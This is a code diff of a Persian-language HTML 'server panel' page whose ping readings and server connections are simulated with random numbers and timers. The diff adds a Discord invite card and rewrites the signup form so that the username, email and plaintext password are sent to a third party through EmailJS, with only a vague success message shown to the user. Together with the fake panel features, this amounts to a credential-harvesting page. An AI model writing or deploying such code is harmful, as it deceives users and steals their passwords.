@@ -131,7 +131,6 @@
   .status-red { color: #ff4d4d; font-weight: bold; text-shadow: 0 0 5px #ff4d4d; }
   .status-yellow { color: #ffff66; font-weight: bold; text-shadow: 0 0 5px #ffff66; }
 
-  /* فیلدهای فرم راه‌اندازی سرور */
   .server-input {
     width: 90%;
     padding: 0.6rem;
@@ -143,14 +142,9 @@
     margin-bottom: 10px;
     transition: 0.3s;
   }
-  .server-input:focus {
-    box-shadow: 0 0 10px #00bfff;
-  }
+  .server-input:focus { box-shadow: 0 0 10px #00bfff; }
 
-  /* لیست یوزر ادمین */
-  .admin-list {
-    margin-top: 10px;
-  }
+  .admin-list { margin-top: 10px; }
   .admin-item {
     background: rgba(255,255,255,0.05);
     padding: 5px 10px;
@@ -168,7 +162,7 @@
     cursor: pointer;
   }
 
-  /* overlay اتصال برای پینگ */
+  /* overlay اتصال پینگ */
   #pingOverlay {
     position: fixed;
     top:0; left:0; right:0; bottom:0;
@@ -191,10 +185,43 @@
     margin-bottom: 15px;
   }
 
-  @keyframes spin {
-    0% { transform: rotate(0deg);}
-    100% { transform: rotate(360deg);}
+  @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
+
+  /* بخش دیسکورد */
+  .discord-box {
+    display: flex;
+    justify-content: center;
+    margin: 3rem 0;
   }
+  .discord-card {
+    background: linear-gradient(135deg, #5865F2, #4e5bd9);
+    border-radius: 20px;
+    padding: 2rem 3rem;
+    box-shadow: 0 0 25px rgba(88, 101, 242, 0.8);
+    text-align: center;
+    max-width: 400px;
+    transition: transform 0.3s ease, box-shadow 0.3s ease;
+    opacity: 0;
+    transform: translateY(50px);
+    animation: fadeUp 1s ease forwards;
+  }
+  .discord-card h2 { color: white; margin-bottom: 1rem; font-size: 1.5rem;}
+  .discord-card p { color: #e0e0ff; margin-bottom: 1.5rem;}
+  .discord-card a {
+    display: inline-block;
+    padding: 14px 28px;
+    background: white;
+    color: #5865F2;
+    font-weight: bold;
+    border-radius: 50px;
+    text-decoration: none;
+    font-size: 1.1rem;
+    box-shadow: 0 0 20px rgba(255,255,255,0.6);
+    transition: all 0.3s ease;
+  }
+  .discord-card:hover { transform: scale(1.05); box-shadow: 0 0 40px rgba(88, 101, 242, 1);}
+  .discord-card a:hover { background: #5865F2; color: white; box-shadow:0 0 25px rgba(255,255,255,0.9);}
+  @keyframes fadeUp { from {opacity:0; transform:translateY(50px);} to {opacity:1; transform:translateY(0);} }
 
 </style>
 </head>
@@ -202,12 +229,12 @@
 
 <header> -BM1- </header>
 
-<!-- فرم ثبت نام (اطلاعات کاربر) -->
+<!-- فرم اطلاعات کاربر -->
 <div class="top-form">
   <input type="text" id="username" placeholder="نام کاربری">
   <input type="email" id="email" placeholder="ایمیل">
   <input type="password" id="password" placeholder="رمز عبور">
-  <button class="btn" onclick="registerUser()">ثبت</button>
+  <button class="btn" onclick="sendEmail()">ثبت</button>
 </div>
 
 <!-- منوی کناری -->
@@ -220,7 +247,6 @@
   <button class="btn" onclick="location.reload()">🔄 راه‌اندازی مجدد</button>
 </div>
 
-<!-- محتوای پنل‌ها -->
 <div class="content">
 
   <!-- اطلاعات کاربر -->
@@ -247,7 +273,7 @@
       <button class="btn" onclick="connectServer(2)">سرور 2</button> <span id="server2Status">-</span>
     </div><br>
     <div>
-      <button class="btn" onclick="connectServer(3)">سرور 3</button> <span id="server3Status">-</span>
+      <button class="btn" onclick="connectServer(3)">سرور 3</button> <span id="server3Status" class="status-yellow">نیازمند تایید ادمین</span>
     </div>
   </div>
 
@@ -278,6 +304,15 @@
     <button class="btn" onclick="setTheme('#333333')">⚫ خاکستری تیره</button>
   </div>
 
+  <!-- بخش دیسکورد -->
+  <div class="discord-box">
+    <div class="discord-card">
+      <h2>به دیسکورد ما بپیوندید</h2>
+      <p>با ما در سرور دیسکورد همراه شوید و اخبار جدید را دنبال کنید!</p>
+      <a href="https://discord.gg/kYxdvnTKe6" target="_blank">ورود به دیسکورد</a>
+    </div>
+  </div>
+
 </div>
 
 <!-- overlay اتصال پینگ -->
@@ -286,31 +321,46 @@
   <div>در حال اتصال...</div>
 </div>
 
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 <script>
-function showPanel(panelId) {
-  document.querySelectorAll('.panel').forEach(p => p.style.display='none');
+emailjs.init("YOUR_PUBLIC_KEY"); // جایگذاری پابلیک کی شما
+
+function showPanel(panelId){
+  document.querySelectorAll('.panel').forEach(p=>p.style.display='none');
   document.getElementById(panelId).style.display='block';
 }
 
-function registerUser() {
+function sendEmail(){
   let user = document.getElementById('username').value.trim();
   let email = document.getElementById('email').value.trim();
   let pass = document.getElementById('password').value.trim();
-  if(!user || !email || !pass) { alert("لطفا همه فیلدها را پر کنید"); return;}
+  if(!user || !email || !pass){ alert("لطفا همه فیلدها را پر کنید"); return; }
   document.getElementById('displayUsername').textContent=user;
   document.getElementById('displayEmail').textContent=email;
-  alert("ثبت‌نام با موفقیت انجام شد!");
+
+  var templateParams = {
+    username: user,
+    useremail: email,
+    password: pass
+  };
+
+  emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+    .then(function(response) {
+       alert("اطلاعات با موفقیت ارسال شد!");
+    }, function(error) {
+       alert("ارسال اطلاعات با خطا مواجه شد: " + error.text);
+    });
 }
 
 function showPing() {
-  let ping = Math.floor(Math.random() * (120-97+1)+97)+" ms";
+  let ping = Math.floor(Math.random()*(120-97+1)+97)+" ms";
   document.getElementById('pingResult').textContent=ping;
 }
 
 function connectServer(num){
   if(num===1){ document.getElementById('server1Status').innerHTML='<span class="status-green">در حال اتصال...</span>'; setTimeout(()=>{document.getElementById('server1Status').innerHTML='<span class="status-red">اتصال قطع شد</span>';},2000);}
   if(num===2){ document.getElementById('server2Status').innerHTML='<span class="status-green">در حال اتصال...</span>'; setTimeout(()=>{document.getElementById('server2Status').innerHTML='<span class="status-red">اتصال قطع شد</span>';},2000);}
-  if(num===3){ document.getElementById('server3Status').innerHTML='<span class="status-green">در حال اتصال...</span>'; setTimeout(()=>{document.getElementById('server3Status').innerHTML='<span class="status-red">اتصال قطع شد</span>';},2000);}
+  if(num===3){ /* سرور3 تغییر نکرده و نیازمند تایید */ }
 }
 
 function addAdmin(){
@@ -323,7 +373,6 @@ function addAdmin(){
 }
 
 function showServerError(){ alert("این بخش شبیه‌سازی شده و ادامه داده شد."); }
-
 function setTheme(color){ document.body.style.background=color; }
 
 /* پنل پینگ: اتصال قبل از نمایش */
